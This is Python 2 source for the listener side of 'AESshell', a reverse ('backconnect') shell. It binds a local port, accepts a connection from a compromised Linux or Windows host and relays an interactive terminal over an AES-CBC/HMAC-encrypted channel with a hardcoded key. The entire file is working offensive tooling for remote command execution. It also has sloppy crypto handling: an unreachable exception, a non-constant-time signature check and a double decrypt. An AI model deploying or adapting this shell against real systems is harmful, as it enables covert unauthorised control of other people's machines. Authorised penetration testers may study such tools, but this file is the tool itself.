#!/usr/bin/env python2
#

import os
import sys
import time
import hmac
import fcntl
import socket
import select
import hashlib
import termios
import argparse

from Crypto.Cipher import AES

class AuthenticationError(Exception): pass

class Crypticle(object):
	"""Authenticated encryption class
	
	Encryption algorithm: AES-CBC
	Signing algorithm: HMAC-SHA256

	"""

	AES_BLOCK_SIZE = 16
	SIG_SIZE = hashlib.sha256().digest_size

	def __init__(self, key_string, key_size=192):
		self.keys = self.extract_keys(key_string, key_size)
		self.key_size = key_size

	@classmethod
	def generate_key_string(cls, key_size=192):
		key = os.urandom(key_size / 8 + cls.SIG_SIZE)
		return key.encode("base64").replace("\n", "")

	@classmethod
	def extract_keys(cls, key_string, key_size):
		key = key_string.decode("base64")
		assert len(key) == key_size / 8 + cls.SIG_SIZE, "invalid key"
		return key[:-cls.SIG_SIZE], key[-cls.SIG_SIZE:]

	def encrypt(self, data):
		"""encrypt data with AES-CBC and sign it with HMAC-SHA256"""
		aes_key, hmac_key = self.keys
		pad = self.AES_BLOCK_SIZE - len(data) % self.AES_BLOCK_SIZE
		data = data + pad * chr(pad)
		iv_bytes = os.urandom(self.AES_BLOCK_SIZE)
		cypher = AES.new(aes_key, AES.MODE_CBC, iv_bytes)
		data = iv_bytes + cypher.encrypt(data)
		sig = hmac.new(hmac_key, data, hashlib.sha256).digest()
		return data + sig

	def decrypt(self, data):
		"""verify HMAC-SHA256 signature and decrypt data with AES-CBC"""
		aes_key, hmac_key = self.keys
		sig = data[-self.SIG_SIZE:]
		data = data[:-self.SIG_SIZE]
		if hmac.new(hmac_key, data, hashlib.sha256).digest() != sig:
			return -1
			raise AuthenticationError("message authentication failed")
		else:
			iv_bytes = data[:self.AES_BLOCK_SIZE]
			data = data[self.AES_BLOCK_SIZE:]
			cypher = AES.new(aes_key, AES.MODE_CBC, iv_bytes)
			data = cypher.decrypt(data)
			return data[:-ord(data[-1])]

	def dumps(self, obj):
		""" argl """
		return self.encrypt(obj)

	def loads(self, obj):
		""" argl """
		data = self.decrypt(obj)
		if data == -1:
			return -1

		return self.decrypt(obj)
																						   
class PTY:
	""" rip off from infodox pty handler implementation
		https://github.com/infodox/python-pty-shells
	"""

	def __init__(self, slave=0, pid=os.getpid()):
		# apparently python GC's modules before class instances so, here
		# we have some hax to ensure we can restore the terminal state.
		self.termios, self.fcntl = termios, fcntl

		# open our controlling PTY
		self.pty  = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

		# store our old termios settings so we can restore after
		# we are finished 
		self.oldtermios = termios.tcgetattr(self.pty)

		# get the current settings se we can modify them
		newattr = termios.tcgetattr(self.pty)

		# set the terminal to uncanonical mode and turn off
		# input echo.
		newattr[3] &= ~termios.ICANON & ~termios.ECHO

		# don't handle ^C / ^Z / ^\
		newattr[6][termios.VINTR] = '\x00'
		newattr[6][termios.VQUIT] = '\x00'
		newattr[6][termios.VSUSP] = '\x00'

		# set our new attributes
		termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

		# store the old fcntl flags
		self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
		# fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
		# make the PTY non-blocking
		fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

	def read(self, size=8192):
		return self.pty.read(size)

	def write(self, data):
		ret = self.pty.write(data)
		self.pty.flush()
		return ret

	def fileno(self):
		return self.pty.fileno()

	def __del__(self):
		# restore the terminal settings on deletion
		self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
		self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)

def banner():
	"""
       _____  ___________ _________      .__           .__  .__   
      /  _  \ \_   _____//   _____/ _____|  |__   ____ |  | |  |  
     /  /_\  \ |    __)_ \_____  \ /  ___/  |  \_/ __ \|  | |  |  
    /    |    \|        \/        \\\\___ \|   Y  \  ___/|  |_|  |__
    \____|__  /_______  /_______  /____  >___|  /\___  >____/____/
        \/        \/        \/     \/     \/     \/           
	"""

def bindSocket(lip,lport):
	# create a socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# reuse the port if possible 
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	# bind it
	s.bind((lip,lport))

	s.listen(1)

	return s

def run(lip, lport, remoteOs):
	key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
	s = bindSocket(lip,lport)
	serv = s
	conn, addr = s.accept()

	# initialize aes class
	ac=Crypticle(key)

	# yeah, we just accept one client ;)
	inputs = []
	inputs.append(conn)

	# spawn pty class from infodox if we expect back a unix client
	pty = ''
	if remoteOs == 'lnx':
		pty = PTY()
		inputs.append(pty)
	else:
		inputs.append(sys.stdin)


	cbuffer = ""
	print "[*] Connected: %s:%d" % (addr[0],addr[1])
	while True:

		try:
			inputrd, outputrd, errorrd = select.select(inputs,[],[])
		except select.error,e:
			print e
			break
		except socket.error,e:
			print e
			break

		for s in inputrd:
			if s == conn:
				data = s.recv(1)

				if data == '':
					print "Backconnect vanished!"
					sys.exit(1)

				cbuffer += data
				decContent = ac.loads(cbuffer)
				if decContent != -1:
					cbuffer = ""
					sys.stdout.write(decContent)
					sys.stdout.flush()

			elif s == pty:
				data = s.read(1024)
				encContent = ac.dumps(data)
				if encContent !=-1:
					conn.send(encContent)
			else:
				# we have a remote win and choosen the ugly stdin method
				sendData = sys.stdin.readline()
				encContent = ac.dumps(sendData)
				if encContent != -1:
					conn.send(encContent)

	print "[*] Finished"

def main():
	print banner.func_doc
	version = "0.7.3"
	parser_description = "AESshell v%s - backconnect shell for windows and linux\n\t\tusing AES CBC Mode and HMAC-SHA256\n\t\tspring 2015 by Marco Lux <ping@curesec.com>" % version
	parser = argparse.ArgumentParser(	prog = 'AESshell client (listen.py)',\
										description = parser_description,\
										formatter_class=argparse.RawTextHelpFormatter)

	parser.add_argument("-lip", action="store",dest="lip", required=True,help="Local IP you want to bind the client part")
	parser.add_argument("-lport", action="store",dest="lport", type=int,required=True,help="Local Port you want to bind to")
	parser.add_argument("-os", action="store",dest="remoteOs", default="lnx",required=True,help="expected remote OS (lnx/win)",choices=['lnx', 'win'])
	args = parser.parse_args()
	run(args.lip,args.lport,args.remoteOs)

if __name__ == '__main__':
	main()
